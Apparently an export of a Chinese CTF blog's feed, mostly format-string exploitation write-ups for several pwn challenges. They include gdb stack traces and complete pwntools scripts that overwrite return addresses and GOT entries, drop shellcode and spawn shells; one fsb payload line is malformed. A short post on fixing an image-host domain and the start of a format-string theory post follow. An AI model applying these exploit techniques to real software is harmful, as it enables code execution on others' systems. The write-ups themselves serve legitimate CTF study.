0xf7fe77eb (&lt;_dl_fixup+11&gt;:    add    esi,0x15815)0020| 0xffffd334 --&gt; 0x00024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x00028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>可以看一下此时的栈情况。可以看到上面有很多可以利用的地址信息，其中最常用的也是ebp链 ：</p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p><strong>也就是这一个，第一次可以通过利用0xffffd338（ebp1）这个地址，其指向0xffffd358 （ebp2），然后利用<code>%xc%4$hhn</code> 就可以修改0xffffd378（ebp3）。</strong><br><strong>将0xffffd378 改为指向ret address的栈地址  <code>0xffffd33c</code>  ：</strong></p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>改完也就是这样的效果。<br><strong>这样就又可以通过利用 0xffffd358 （ebp2），其指向 0xffffd33c（ebp3），</strong><br><strong>接着就算一下0xffffd358 （ebp2）的偏移 y，然后利用<code>%xc%y$hhn</code> 就可以修改0x804852c（ret address）</strong></p><p>这样攻击思路也就出来了，可以修改retaddress ，返回在可控的buf 上面放好shellcode ，控制程序跳到shellcode即可。</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><h2 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h2><h3 id="保护和arch-5"><a href="#保护和arch-5" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>没有任何保护。</p><h3 id="ida分析-6"><a href="#ida分析-6" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>上层有play 和 main函数，一共三层，在第三层的这个函数存在格式化字符串漏洞，让我们很方便的用ebp链来做题。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，也就以为着可以用shellcode进行攻击。然后还是改返回地址，提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h3 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p><p>如图所示，利用这个链即可。先想办法把<code>Oxffffd358</code>  改成 <code>Oxffffd33c</code> :</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p><p>然后在想办法把0x8048507 这个返回地址改成我们摆放的shellcode的地址即可。</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./playfmt&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,26382)buf = 0x0804A060 + 0x40 #0x804a0a0offset1 = 6offset2 = 10info(&#39;---leak stack address---&#39;)io.recvuntil(&#39;\n=====================\n&#39;)io.sendline(&#39;%10$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))info(&#39;---change the retaddr---&#39;)key = int(str(hex(ret_stack_addr))[-2:],16)payload = &quot;%{}c%6$hhn&quot;.format(key)raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.recv()key2 = 0xa0a0payload = &quot;%{}c%10$hn&quot;.format(key2)payload = payload.ljust(0x40)payload += asm(shellcraft.sh())raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()sleep(0.1)io.sendline(&#39;quit&#39;)io.interactive()</code></pre><p>记得发出去一次payload，一定需要接受一次，再去发第二个payload，防止没有完成一个printf，就让程序接受发送的东西，这样容易崩溃。</p><h2 id="pwnable-fsb"><a href="#pwnable-fsb" class="headerlink" title="pwnable-fsb"></a>pwnable-fsb</h2><h3 id="arch和保护"><a href="#arch和保护" class="headerlink" title="arch和保护"></a>arch和保护</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开了nx了。</p><h3 id="ida分析-7"><a href="#ida分析-7" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c"> for ( k = 0; k &lt;= 3; ++k )  {    printf(&quot;Give me some format strings(%d)\n&quot;, k + 1);    read(0, buf, 0x64u);    printf(buf);  }  puts(&quot;Wait a sec...&quot;);  sleep(3u);</code></pre><p>可以看到这里控制了可以利用printf函数漏洞的次数，只可以利用4次。</p><pre><code class="c">  execve(path, &amp;path, 0);</code></pre><p>且这一条可以给你拿到shell。</p><p>那攻击思路就可以是改掉puts，sleep的got表，到这个拿取shell的位置就行。<br>因为这里下面就调用一次sleep，就改它好了，基本不会出问题。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/b41nYE.png" srcset="/img/loading.gif" alt><br>注意一下这里的汇编代码，其也是让栈的esp处于不定的状态。</p><h3 id="gdb分析-1"><a href="#gdb分析-1" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>此时的EBP = 0xffffd228 </p><pre><code>0000| 0xffffd1e0 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0004| 0xffffd1e4 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0008| 0xffffd1e8 --&gt; 0x64 (&#39;d&#39;)0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (&quot;__vdso_clock_gettime&quot;)0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;:    add    ebx,0x1b037)0020| 0xffffd1f4 --&gt; 0x00024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x00028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;:    cmp    DWORD PTR gs:0xc,0x0)0036| 0xffffd204 --&gt; 0x8048870 (&quot;/bin/sh&quot;)0040| 0xffffd208 --&gt; 0x00044| 0xffffd20c --&gt; 0x00048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x00052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 (&#39;&#39;)0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x00060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x00064| 0xffffd220 --&gt; 0x00068| 0xffffd224 --&gt; 0x10072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p>可以看到，因为这个题是main -&gt; fsb ,用户代码只有2层函数的调用，看这个ebp chain的时候就有点不方便了，我们没有一个完整的chain来使用。这个时候，就只能把ebp3 的值，自己写上去，写上sleep的got然后再改成拿shell的地址就行了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/Bb3DnD.png" srcset="/img/loading.gif" alt><br><strong>整个过程还是需要泄漏一下栈地址esp，因为其栈是变化的。泄露以后，也获取一下ebp2的值，然后（ebp2- esp ）/4 也就确定到了，main的ebp值（ebp3）对应格式化字符串的偏移值。</strong>然后再次利用printf函数根据这个偏移来进行改写sleep got上的值。</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./fsb&#39;)# s = ssh(#     host=&quot;pwnable.kr&quot;,#     port=2222,#     user=&quot;fsb&quot;,#     password=&quot;guest&quot;# )# io = s.run(&quot;/home/fsb/fsb&quot;)# io = shell.run(&quot;/home/fsb/fsb&quot;)sleep_got = 0x0804a008info(&#39;--------leak stack base:-------&#39;)io.recvuntil(&#39;strings(1)\n&#39;)io.sendline(&#39;%14$p&#39;)io.recvuntil(&#39;0x&#39;)stack_base = int(io.recv(8),16) - 80print(hex(stack_base))info(&#39;--------leak the point to main ebp:-------&#39;)io.recvuntil(&#39;strings(2)\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)point = int(io.recv(8),16)print(hex(point))info(&#39;--------write sleep_got to main_ebp :-------&#39;)io.recvuntil(&#39;strings(3)\n&#39;)key1 = 0x0804A008payload = &#39;%&#39; + str(key1) + &#39;c%18$n&#39;io.sendline(payload)info(&#39;--------write tag to sleep_got :-------&#39;)tag = 0x869Foffset = (point - stack_base) / 4payload = &quot;%{}c%&#39;str(offset)&#39;$hn &quot;.format(tag)io.recvuntil(&#39;strings(4)\n&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h2><h3 id="保护和arch-6"><a href="#保护和arch-6" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="ida分析-8"><a href="#ida分析-8" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt><br>这一处会让栈的情况变得无法预测。然后进入hardfmt：</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>这一处存在漏洞，且往下看感觉没什么好利用的，没什么漏洞函数。那攻击思路就是：改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。<br>（这个题目思路还是很简单的，但是因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞。）</p><h3 id="gdb分析-2"><a href="#gdb分析-2" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt></p><p>仔细看下此时的栈情况 ，然后再次分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got地址+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址</li></ul><p>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。<br>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个框框，可以发现把第二个框框的两个地址修改为 第一个框框的栈指针：</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt><br>这个过程在泄漏目标栈地址以后，也是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址：</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>然后就可以写system的内存地址上got了：</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>这样再传过去一下<code>/bin/sh</code>即可。</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continue# io = def fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload +=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。<h3 id="结论和收获"><a href="#结论和收获" class="headerlink" title="结论和收获"></a>结论和收获</h3></li></ul><p>这个题教会我一定要<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。还有就是面对这种会有随机栈情况的题目，尽量要注意本地和远程的ibc版本、注意环境,这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p><h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman-2019-format"></a>xman-2019-format</h2><h3 id="保护和arch-7"><a href="#保护和arch-7" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>CANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partial</code></pre><h3 id="ida分析-9"><a href="#ida分析-9" class="headerlink" title="ida分析"></a>ida分析</h3><pre><code class="c">char *__cdecl sub_80485C4(char *s){  char *v1; // eax  char *result; // eax  puts(&quot;...&quot;);  v1 = strtok(s, &quot;|&quot;);  printf(v1);  while ( 1 )  {    result = strtok(0, &quot;|&quot;);    if ( !result )      break;    printf(result);  }  return result;}</code></pre><p>这里因为用strtok做处理，只有一次的传送机会，payload需要用<code>|</code>    分割格式化字符串来完成每次的printf的漏洞利用，稍微麻烦了一下。<br>并且存在后门函数：</p><pre><code>.text:080485AB                 push    ebp.text:080485AC                 mov     ebp, esp.text:080485AE                 sub     esp, 8.text:080485B1 ; 3:   return system(&quot;/bin/sh&quot;);.text:080485B1                 sub     esp, 0Ch.text:080485B4                 push    offset command  ; &quot;/bin/sh&quot;.text:080485B9                 call    _system.text:080485BE                 add     esp, 10h.text:080485C1                 nop.text:080485C2                 leave.text:080485C3                 retn</code></pre><p>这下可以直接改ret address即可。</p><h3 id="gdb分析-3"><a href="#gdb分析-3" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>先观察一下ebp链是否存在 ：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8H01Yk.png" srcset="/img/loading.gif" alt><br>是存在的，然后直接利用就好了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/e2PTss.png" srcset="/img/loading.gif" alt><br>看一下，在第一次改ebp2里面的值： 0xffffd338 时，发现下面的第二个只需要改一个字节即可，然后目标就是改成这个栈地址了：<br><img src="http://qiqianyun.chumen77.xyz/uPic/cYhR45.png" srcset="/img/loading.gif" alt><br>然后接着利用漏洞，改一下返回地址到后门函数即可。</p><p>（这个题自己在做的时候，先是试着利用第二个的0xffffd2f8 ，这个链发现本地可以打通，远程是不行的，这就是环境因素了，远程由于libc版本的不同，栈结构也是不同的。所以做题还是优先，考虑ebp链，然后没法利用了，在考虑充分利用栈数据，这个通常也是出题人精心设计的栈结构，让你有数据可以利用。）</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;system_addr = 0x080485B4tag1 = 0x4ctag2 = 0x85abio = process(&#39;./xman_2019_format&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27012)payload = &#39;%{}c%10$hhn|&#39;.format(0x4c)payload += &#39;%{}c%18$hn~&#39;.format(0x85ab)while True:    try:        io.recvuntil(&#39;...\n...\n&#39;)        io.sendline(payload)        sleep(0.1)        io.recvuntil(&#39;~&#39;)        io.sendline(&#39;ls&#39;)        io.recvline()        io.recvline()        io.interactive()        break    except EOFError :        io.close()        io = process(&#39;./xman_2019_format&#39;)        # io = remote(&#39;node3.buuoj.cn&#39;,27012)</code></pre><p>需要爆破栈。</p><h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf-2019-playfmt"></a>suctf-2019-playfmt</h2><h3 id="保护和arch-8"><a href="#保护和arch-8" class="headerlink" title="保护和arch"></a>保护和arch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>开启了RELRO，这样就无法got hijack了</p><h3 id="ida分析-10"><a href="#ida分析-10" class="headerlink" title="ida分析"></a>ida分析</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/ycZIc7.png" srcset="/img/loading.gif" alt></p><h3 id="gdb分析-4"><a href="#gdb分析-4" class="headerlink" title="gdb分析"></a>gdb分析</h3><p>程序先读入了flag文件，自己可以写一个flag文件测试，并且gdb跟随：<br><img src="http://qiqianyun.chumen77.xyz/uPic/TqMvc5.png" srcset="/img/loading.gif" alt><br>其会被读到堆上。紧接着跟到格式化字符串漏洞处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/DqFQFq.png" srcset="/img/loading.gif" alt><br>看一下这个堆地址是否被程序操作修改了：</p><pre><code>gdb-peda$ x/s 0x8050b700x8050b70:    &quot;flag{f9255a80-e059-4c12-8788-161bf8c6908b}&quot;</code></pre><p>发现并没有，那就很简单了。攻击思路就是，在栈上构造出这个存放flag的堆地址（计算方式就是在此时的栈上找一个地址来计算偏移获取）。<br>第一步：<br><img src="http://qiqianyun.chumen77.xyz/uPic/kOCpje.png" srcset="/img/loading.gif" alt><br>先修改ebp2上存放的值，改成后面那个框框对应的栈地址，然后在做处理：</p><pre><code>0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0</code></pre><p>此时再修改ebp1上的值，改成刚刚的堆地址 ：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/0sJJGL.png" srcset="/img/loading.gif" alt><br>这样exp写的时候，找好偏移%s一下就出来了。</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = remote(&#39;node3.buuoj.cn&#39;,27816)io = process(&#39;./1&#39;)io.recvuntil(&#39;Magic echo Server&#39;)io.recvuntil(&#39;=====================\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)flag = int(io.recv(8),16)print(hex(flag))key = int((hex(flag))[-4:],16) - 32 -12 -4print(&#39;key&#39;+ hex(key))# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%6$p&#39;)io.recvuntil(&#39;0x&#39;)stack_point = int(io.recv(8),16) + 16tag1 = int((hex(stack_point))[-2:],16)print(hex(tag1))payload  = &#39;%&#39; + str(tag1) + &#39;c%6$hhn&#39; + &#39;1&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1&#39;)payload = &#39;%&#39; +  str(key &amp; 0xffff) + &#39;c%14$hn&#39; + &#39;2&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;2&#39;)io.sendline(&#39;%18$s&#39;)io.interactive()</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;格式化字符串漏洞题目练习&quot;&gt;&lt;a href=&quot;#格式化字符串漏洞题目练习&quot; class=&quot;headerlink&quot; title=&quot;格式化字符串漏洞题目练习&quot;&gt;&lt;/a&gt;格式化字符串漏洞题目练习&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="学习记录" scheme="http://chumen77.xyz/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
  <entry>
    <title>修复七千云外链失效</title>
    <link href="http://chumen77.xyz/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/"/>
    <id>http://chumen77.xyz/2020/03/12/修复七千云外链失效/</id>
    <published>2020-03-12T15:17:10.000Z</published>
    <updated>2020-03-13T02:48:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="修复七千云外链失效"><a href="#修复七千云外链失效" class="headerlink" title="修复七千云外链失效"></a>修复七千云外链失效</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>自己的以前申请过一个七千云做自己的图床，今晚写博客发现，自己上传不上图片，并且用upic导出来的链接无法显示图片了。查了很久的原因，发现是七千牛原来给我分配的免费外链域名给我断用了。<br><img src="http://qiqianyun.chumen77.xyz/uPic/78YdoJ.png" srcset="/img/loading.gif" alt><br>就是这个没了，自己排错，排了半天才发现。是在这里找到的，好隐蔽。。。<br><img src="http://qiqianyun.chumen77.xyz/uPic/aeXsve.png" srcset="/img/loading.gif" alt><br>然后就在文件管理那里发现，网站提示说如果无法显示图片，加载慢，可以加一个域名。然后我就尝试加了一个，然后就修复好了。</p><h2 id="修复过程"><a href="#修复过程" class="headerlink" title="修复过程"></a>修复过程</h2><h3 id="绑定创建域名"><a href="#绑定创建域名" class="headerlink" title="绑定创建域名"></a>绑定创建域名</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/XxkzAY.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/sW0Ju4.png" srcset="/img/loading.gif" alt><br>xxxx也就是填你的域名，前面的可以自定义。点击添加后下面总是会自动又弹出一个空白的框，点击后面的删除，否则，往下滑你会发现就是创建不了这个记录。<br>创建成功后，会提示你复制<strong>CNAME</strong>，复制一下，去往你自己的域名网站，我用的是阿里云。</p><h3 id="去自己的dns解析平台"><a href="#去自己的dns解析平台" class="headerlink" title="去自己的dns解析平台"></a>去自己的dns解析平台</h3><p>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/meWpeP.png" srcset="/img/loading.gif" alt><br>这里的主机记录填入刚刚你自定义的主机开头，记录值填入刚刚复制的CNAME，就可以了。</p><h3 id="修改upic设置"><a href="#修改upic设置" class="headerlink" title="修改upic设置"></a>修改upic设置</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/adszoz.png" srcset="/img/loading.gif" alt><br>填入即可，以前写的博客，图片的链接也要改一下，就恢复原来的样子了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;修复七千云外链失效&quot;&gt;&lt;a href=&quot;#修复七千云外链失效&quot; class=&quot;headerlink&quot; title=&quot;修复七千云外链失效&quot;&gt;&lt;/a&gt;修复七千云外链失效&lt;/h1&gt;&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; 
      
    
    </summary>
    
    
      <category term="杂项" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串漏洞小总结（上）</title>
    <link href="http://chumen77.xyz/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <id>http://chumen77.xyz/2020/03/12/格式化字符串漏洞小总结（上）/</id>
    <published>2020-03-12T13:13:41.000Z</published>
    <updated>2020-04-03T09:00:26.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞小总结（上）"><a href="#格式化字符串漏洞小总结（上）" class="headerlink" title="格式化字符串漏洞小总结（上）"></a>格式化字符串漏洞小总结（上）</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下，在学习这个漏洞时候的自己感觉的疑难点，和做题时候的一点小技巧，这一篇主要是记录理论。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>基本格式：</p><pre><code class="c">%[parameter][flags][field width][.precision][length]type</code></pre><p>需要重点关注的pattern：</p><ol><li>parameter ：n$，获取格式化字符串中的指定参数</li><li>field width ：输出的最小宽度</li><li>precision ：输出的最大长度</li><li>length，输出的长度 : <code>hh，1-byte ； h，2-byte ； l, 4-byte ；ll,8-byte ；</code></li><li>type :<pre><code class="c"> d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母. s，输出以null 结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。 c，把 int 参数转为 unsigned char 型输出 p， void * 型，输出对应变量的值。printf(&quot;%p&quot;,a) 用地址的格式打印变量 a 的值，printf(&quot;%p&quot;, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。（仅仅是在这一个printf的函数） %， 